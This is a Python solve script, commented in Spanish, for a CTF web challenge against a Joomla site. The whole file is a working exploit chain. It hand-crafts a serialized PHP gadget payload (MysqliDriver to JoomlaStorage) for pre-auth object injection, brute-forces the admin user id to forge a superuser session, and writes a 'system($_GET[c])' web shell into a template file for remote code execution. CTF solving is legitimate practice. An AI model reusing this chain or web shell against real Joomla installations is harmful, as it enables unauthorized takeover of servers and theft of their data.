#!/usr/bin/env python3
r"""Provisioneds - Cyber Apocalypse CTF 2026 (web)

Cadena:
  1. El plugin gatehouse llama a @unserialize() sobre el parametro `ledger` desde
     onAfterRoute, que en Joomla corre ANTES de que dispatch() exija login de admin
     -> object injection pre-auth.
  2. Gadget: MysqliDriver::__destruct -> disconnect() -> $this->connection->close()
     con connection = JoomlaStorage, cuyo close() hace
     $_SESSION['joomla'] = base64_encode(serialize($this->data)) + session_write_close()
     -> escribimos a voluntad los datos de NUESTRA sesion.
  3. Metemos un Joomla\CMS\User\User con el id del admin; User::__wakeup() lo rehidrata
     desde la BD en la siguiente peticion -> somos superusuario.
     El id es aleatorio por despliegue, asi que se descubre por barrido.
  4. Como admin, com_templates escribe un .php en la plantilla -> RCE -> /readflag (SUID).

Uso: ./solve.py http://HOST:PUERTO
"""
import base64
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:1337').rstrip('/')
ADMIN = BASE + '/administrator/index.php'
DOCROOT = '/var/www/html'
ID_MAX = 1200          # el instalador de Joomla asigna un id aleatorio (~1..1000)
WORKERS = 6            # prod corta conexiones si se le mete demasiada concurrencia
RETRIES = 4

MYSQLI = 'Joomla\\Database\\Mysqli\\MysqliDriver'
STORAGE = 'Joomla\\CMS\\Session\\Storage\\JoomlaStorage'
REGISTRY = 'Joomla\\Registry\\Registry'
USER = 'Joomla\\CMS\\User\\User'


# --- serializacion PHP a mano ---------------------------------------------

def s(v):
    return 's:%d:"%s";' % (len(v.encode()), v)


def i(n):
    return 'i:%d;' % n


def b(v):
    return 'b:%d;' % (1 if v else 0)


def prot(name):
    return s('\x00*\x00' + name)


def priv(cls, name):
    return s('\x00' + cls + '\x00' + name)


def obj(cls, props):
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), ''.join(k + v for k, v in props))


def arr(items):
    return 'a:%d:{%s}' % (len(items), ''.join(k + v for k, v in items))


def registry(props):
    return obj(REGISTRY, [
        (prot('data'), obj('stdClass', props)),
        (prot('initialized'), b(False)),
        (prot('separator'), s('.')),
    ])


def payload(uid):
    """Datos de sesion con el usuario `uid` como identidad."""
    now = int(time.time())
    user = obj(USER, [
        (s('id'), i(uid)),
        (s('guest'), i(0)),
        (prot('isRoot'), b(True)),
    ])
    data = registry([
        (s('session'), obj('stdClass', [
            (s('counter'), i(2)),
            (s('timer'), obj('stdClass', [(s('start'), i(now)),
                                          (s('last'), i(now)),
                                          (s('now'), i(now))])),
            (s('token'), s('0' * 32)),
        ])),
        (s('registry'), registry([])),
        (s('user'), user),
    ])
    storage = obj(STORAGE, [(priv(STORAGE, 'data'), data)])
    driver = obj(MYSQLI, [(prot('connection'), storage)])
    return arr([(i(0), driver)])


# --- pasos del exploit -----------------------------------------------------

def _retry(fn):
    last = None
    for attempt in range(RETRIES):
        try:
            return fn()
        except requests.RequestException as exc:
            last = exc
            time.sleep(0.5 * (attempt + 1))
    raise last


def poison(session, uid):
    """Envenena la sesion y devuelve el HTML renderizado en ESTA peticion,
    que refleja el estado dejado por el envenenamiento ANTERIOR."""
    return _retry(lambda: session.post(
        ADMIN,
        params={'option': 'com_provision', 'view': 'dispatch', 'task': 'ledger.import'},
        data={'ledger': payload(uid)},
        timeout=25,
    ).text)


def is_admin(html):
    # 'Home Dashboard' es el <title> tambien en la pantalla de login; hay que
    # mirar marcadores que solo existen tras autenticar como superusuario.
    return 'com_cpanel' in html or 'task=user.logout' in html


def hunt_slice(offset):
    """Barre los ids offset, offset+WORKERS, ... encadenando envenenamiento y
    comprobacion en la misma peticion. El destructor corre al final de la
    peticion, asi que el HTML que recibimos refleja el envenenamiento ANTERIOR:
    por eso comprobamos el id `previous`."""
    session = requests.Session()
    _retry(lambda: session.get(ADMIN, timeout=25))
    previous = None

    for uid in range(offset + 1, ID_MAX + 1, WORKERS):
        html = poison(session, uid)
        if previous is not None and is_admin(html):
            return previous, session
        previous = uid

    if previous is not None and is_admin(_retry(lambda: session.get(ADMIN, timeout=25)).text):
        return previous, session
    return None


def find_admin_session():
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = [pool.submit(hunt_slice, k) for k in range(WORKERS)]
        for future in futures:
            try:
                result = future.result()
            except requests.RequestException:
                continue
            if result:
                return result
    return None


def rce(session, command):
    """com_templates: sobrescribe un .php de la plantilla y lo invoca."""
    listing = session.get(ADMIN, params={'option': 'com_templates', 'view': 'templates',
                                         'client_id': 0}, timeout=20).text
    ext_id = re.search(r'view=template&(?:amp;)?id=(\d+)', listing)
    if not ext_id:
        raise RuntimeError('no encuentro plantillas editables')
    ext_id = ext_id.group(1)

    editor = session.get(ADMIN, params={'option': 'com_templates', 'view': 'template',
                                        'id': ext_id, 'file': base64.b64encode(b'/offline.php').decode()},
                         timeout=20).text
    token = re.search(r'name="([a-f0-9]{32})" value="1"', editor)
    filename = re.search(r'name="jform\[filename\]"[^>]*value="([^"]+)"', editor)
    if not (token and filename):
        raise RuntimeError('no encuentro token/filename en el editor de plantillas')
    token, filename = token.group(1), filename.group(1)

    session.post(ADMIN,
                 params={'option': 'com_templates', 'view': 'template', 'id': ext_id,
                         'file': base64.b64encode(b'/offline.php').decode()},
                 data={'task': 'template.apply',
                       'jform[extension_id]': ext_id,
                       'jform[filename]': filename,
                       'jform[source]': '<?php system($_GET["c"]); ?>',
                       token: '1'},
                 timeout=20)

    shell_url = BASE + filename.replace(DOCROOT, '', 1)
    return requests.get(shell_url, params={'c': command}, timeout=20).text


def main():
    print(f'[*] objetivo: {BASE}')
    print('[*] buscando el id del administrador (aleatorio por despliegue)...')
    found = find_admin_session()
    if not found:
        print('[-] no se encontro un id valido en el rango')
        return 1

    uid, session = found
    print(f'[+] admin uid={uid}, sesion forjada')

    # Reafirmar el envenenamiento con el uid confirmado: durante el barrido la
    # sesion quedo con el envenenamiento del id siguiente (desfase del destructor).
    poison(session, uid)
    poison(session, uid)

    out = rce(session, '/readflag')
    flag = re.search(r'HTB\{[^}]+\}', out)
    print(f'[+] flag: {flag.group(0)}' if flag else f'[-] sin flag, salida:\n{out[:400]}')
    return 0 if flag else 1


if __name__ == '__main__':
    sys.exit(main())
